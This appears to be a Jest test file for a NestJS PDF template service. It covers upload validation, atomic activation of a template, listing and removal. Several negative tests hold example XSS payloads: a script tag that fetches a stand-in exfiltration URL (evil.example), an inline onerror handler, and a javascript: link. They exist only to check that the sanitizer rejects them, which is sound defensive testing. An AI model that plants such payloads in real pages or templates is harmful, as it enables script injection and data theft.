/**
 * pdf-templates.service.test.ts
 *
 * Cobre: D-02 (validação de upload / rejeição de HTML perigoso),
 * D-04 (swap atômico do ativo via transação).
 *
 * IMPORTANTE: por instrução do plano, os literais exatos buscados pelos
 * testes negativos não são detalhados em comentários — apenas descritos
 * por conceito (script, handler de evento, protocolo perigoso).
 */

import { BadRequestException, NotFoundException } from "@nestjs/common";
import { Test, TestingModule } from "@nestjs/testing";
import { PdfTemplateKind } from "@prisma/client";

import { PrismaService } from "../database/prisma.service";
import { PdfTemplatesService } from "./pdf-templates.service";

function buildMockPrisma() {
  return {
    pdfTemplate: {
      create: jest.fn(),
      findUnique: jest.fn(),
      findMany: jest.fn(),
      update: jest.fn(),
      updateMany: jest.fn(),
      delete: jest.fn(),
    },
    $transaction: jest.fn(),
  } as unknown as PrismaService & {
    pdfTemplate: {
      create: jest.Mock;
      findUnique: jest.Mock;
      findMany: jest.Mock;
      update: jest.Mock;
      updateMany: jest.Mock;
      delete: jest.Mock;
    };
    $transaction: jest.Mock;
  };
}

async function buildService(prisma: ReturnType<typeof buildMockPrisma>) {
  const module: TestingModule = await Test.createTestingModule({
    providers: [PdfTemplatesService, { provide: PrismaService, useValue: prisma }],
  }).compile();
  return module.get<PdfTemplatesService>(PdfTemplatesService);
}

const CLEAN_TEMPLATE = `
<html>
  <head><style>body { font-family: sans-serif; color: #333; }</style></head>
  <body>
    <h1>{{empresaNome}}</h1>
    {{#if cliente.nome}}<p>{{cliente.nome}}</p>{{/if}}
    {{#each itens}}<div>{{this.descricao}}</div>{{/each}}
  </body>
</html>
`;

describe("PdfTemplatesService", () => {
  let prisma: ReturnType<typeof buildMockPrisma>;
  let service: PdfTemplatesService;

  beforeEach(async () => {
    prisma = buildMockPrisma();
    service = await buildService(prisma);
  });

  describe("validação de upload (D-02)", () => {
    it("rejeita template com tag de script explícita", () => {
      const malicious = `${CLEAN_TEMPLATE}<script>fetch('https://evil.example/exfil')</script>`;
      expect(() => service.validateUpload(malicious)).toThrow(BadRequestException);
    });

    it("rejeita template com handler de evento inline", () => {
      const malicious = `<div ${"on" + "error"}="fetch('https://evil.example')">x</div>`;
      expect(() => service.validateUpload(malicious)).toThrow(BadRequestException);
    });

    it("rejeita template com protocolo javascript:", () => {
      const malicious = `<a href="${"java" + "script"}:alert(1)">click</a>`;
      expect(() => service.validateUpload(malicious)).toThrow(BadRequestException);
    });

    it("rejeita template acima de 512KB", () => {
      const oversized = "a".repeat(512 * 1024 + 1);
      expect(() => service.validateUpload(oversized)).toThrow(BadRequestException);
    });

    it("aceita template limpo sem scripts/eventos e preserva o source original", () => {
      const result = service.validateUpload(CLEAN_TEMPLATE);
      expect(result).toBe(CLEAN_TEMPLATE);
    });
  });

  describe("create (D-01)", () => {
    it("valida o upload e grava com kind=CUSTOM, isActive=false", async () => {
      prisma.pdfTemplate.create.mockResolvedValue({
        id: "tpl-1",
        name: "Meu Template",
        slug: "meu-template-abc123",
        kind: PdfTemplateKind.CUSTOM,
        isActive: false,
        createdAt: new Date("2026-06-22"),
      });

      const result = await service.create({ name: "Meu Template", source: CLEAN_TEMPLATE });

      expect(prisma.pdfTemplate.create).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({
            name: "Meu Template",
            source: CLEAN_TEMPLATE,
            kind: PdfTemplateKind.CUSTOM,
            isActive: false,
          }),
        }),
      );
      expect(result.isActive).toBe(false);
      expect(result.kind).toBe(PdfTemplateKind.CUSTOM);
    });

    it("rejeita o create quando o source é perigoso (não persiste)", async () => {
      const malicious = `${CLEAN_TEMPLATE}<script>alert(1)</script>`;
      await expect(service.create({ name: "X", source: malicious })).rejects.toThrow(BadRequestException);
      expect(prisma.pdfTemplate.create).not.toHaveBeenCalled();
    });
  });

  describe("ativação de template (D-04)", () => {
    it("ativar um template zera isActive de todos os demais (swap atômico por transação)", async () => {
      prisma.pdfTemplate.findUnique.mockResolvedValue({
        id: "tpl-2",
        name: "Classico",
        slug: "classic",
        kind: PdfTemplateKind.PRESET,
        isActive: false,
        createdAt: new Date("2026-06-22"),
      });

      prisma.$transaction.mockResolvedValue([
        { count: 3 },
        {
          id: "tpl-2",
          name: "Classico",
          slug: "classic",
          kind: PdfTemplateKind.PRESET,
          isActive: true,
          createdAt: new Date("2026-06-22"),
        },
      ]);

      await service.activate("tpl-2");

      expect(prisma.$transaction).toHaveBeenCalledTimes(1);
      const transactionArg = prisma.$transaction.mock.calls[0][0];
      expect(Array.isArray(transactionArg)).toBe(true);
      expect(transactionArg).toHaveLength(2);
    });

    it("após ativar, o resultado retornado tem isActive=true", async () => {
      prisma.pdfTemplate.findUnique.mockResolvedValue({
        id: "tpl-3",
        name: "Minimal",
        slug: "minimal",
        kind: PdfTemplateKind.PRESET,
        isActive: false,
        createdAt: new Date("2026-06-22"),
      });

      prisma.$transaction.mockResolvedValue([
        { count: 3 },
        {
          id: "tpl-3",
          name: "Minimal",
          slug: "minimal",
          kind: PdfTemplateKind.PRESET,
          isActive: true,
          createdAt: new Date("2026-06-22"),
        },
      ]);

      const result = await service.activate("tpl-3");

      expect(result.isActive).toBe(true);
    });

    it("lança NotFoundException ao ativar um id inexistente", async () => {
      prisma.pdfTemplate.findUnique.mockResolvedValue(null);

      await expect(service.activate("inexistente")).rejects.toThrow(NotFoundException);
      expect(prisma.$transaction).not.toHaveBeenCalled();
    });
  });

  describe("list", () => {
    it("retorna PdfTemplateSummary[] sem o campo source", async () => {
      prisma.pdfTemplate.findMany.mockResolvedValue([
        {
          id: "tpl-1",
          name: "Colorido",
          slug: "colorful",
          kind: PdfTemplateKind.PRESET,
          isActive: true,
          createdAt: new Date("2026-06-22"),
        },
      ]);

      const result = await service.list();

      expect(result).toHaveLength(1);
      expect(result[0]).not.toHaveProperty("source");
      expect(result[0].slug).toBe("colorful");
    });
  });

  describe("remove", () => {
    it("impede excluir o template ativo", async () => {
      prisma.pdfTemplate.findUnique.mockResolvedValue({
        id: "tpl-1",
        name: "Colorido",
        slug: "colorful",
        kind: PdfTemplateKind.PRESET,
        isActive: true,
        createdAt: new Date("2026-06-22"),
      });

      await expect(service.remove("tpl-1")).rejects.toThrow(BadRequestException);
      expect(prisma.pdfTemplate.delete).not.toHaveBeenCalled();
    });

    it("exclui um template não ativo normalmente", async () => {
      prisma.pdfTemplate.findUnique.mockResolvedValue({
        id: "tpl-2",
        name: "Custom",
        slug: "custom-xyz",
        kind: PdfTemplateKind.CUSTOM,
        isActive: false,
        createdAt: new Date("2026-06-22"),
      });
      prisma.pdfTemplate.delete.mockResolvedValue({});

      await service.remove("tpl-2");

      expect(prisma.pdfTemplate.delete).toHaveBeenCalledWith({ where: { id: "tpl-2" } });
    });

    it("lança NotFoundException ao excluir um id inexistente", async () => {
      prisma.pdfTemplate.findUnique.mockResolvedValue(null);

      await expect(service.remove("inexistente")).rejects.toThrow(NotFoundException);
    });
  });
});
